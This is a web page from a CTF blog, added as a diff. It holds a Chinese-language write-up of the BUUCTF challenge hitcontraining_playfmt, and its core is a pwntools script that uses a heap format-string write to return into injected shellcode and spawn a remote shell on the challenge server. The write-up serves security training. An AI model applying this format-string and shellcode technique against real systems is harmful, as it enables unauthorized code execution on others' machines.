@@ -1,0 +1,32 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>BUU-hitcontraining_playfmt-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="在看这篇WP前，如果你不了解堆上的格式化字符串的利用方法，建议你先看一下这一篇WP。 这道题和xman_2019_format这题基本没什么差"><meta property="og:image" content><meta property="og:title" content="BUU-hitcontraining_playfmt-WP"><meta property="og:description" content="在看这篇WP前，如果你不了解堆上的格式化字符串的利用方法，建议你先看一下这一篇WP。 这道题和xman_2019_format这题基本没什么差"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/buu-hitcontraining_playfmt-wp.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-12-08T19:01:00+00:00"><meta property="article:modified_time" content="2020-12-08T19:01:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="BUU-hitcontraining_playfmt-WP"><meta name=twitter:description content="在看这篇WP前，如果你不了解堆上的格式化字符串的利用方法，建议你先看一下这一篇WP。 这道题和xman_2019_format这题基本没什么差"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>BUU-hitcontraining_playfmt-WP</h1><div class=meta>Posted on Dec 8, 2020</div></div><section class=body><p>在看这篇WP前，如果你不了解堆上的格式化字符串的利用方法，建议你先看一下<a href=https://www.cjovi.icu/WP/buu-xman_2019_format-wp.html>这一篇WP</a>。</p><p>这道题和xman_2019_format这题基本没什么差别，就是没了原来的后门函数，但是这题没开NX，所以我们可以注入shellcode然后retrun到那里就可以了。程序也没有开启PIE，那么shellcode在的位置就是</p><div class=wp-block-image><figure class="aligncenter size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/12/QQ截图20201208185629.png alt class=wp-image-779></figure></div><p>buf所在的位置</p><pre class=wp-block-code><code>from pwn import *                                    
+context(log_level = 'debug',os = 'linux',arch = 'i386')
+shellcode = asm(shellcraft.sh())                     
+                                                     
+while 1:                                             
+    #sh = process("./playfmt")                       
+    sh = remote("node3.buuoj.cn","26226")            
+                                                     
+    payload = "%12c" + "%6$hhn"                      
+    sh.recvuntil("=\n")                              
+    sh.sendlineafter("=\n",payload)                  
+                                                     
+    payload = "%41069c" + "%10$hn" + shellcode   
+    #由于我这里一起注入了shellcode，所以输出的字符数是0xA060+13  
+    sh.sendline(payload)                             
+    sh.sendline('quit')                              
+                                                     
+    try:                                             
+    ┊   sh.sendline("echo pwned")                    
+    ┊   sh.recvuntil("pwned")                        
+    ┊   sh.interactive()                             
+    ┊   break;                                       
+    except:                                          
+    ┊   sh.close()                                   
+                                                       </code></pre><p></p></section><div class=post-tags></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
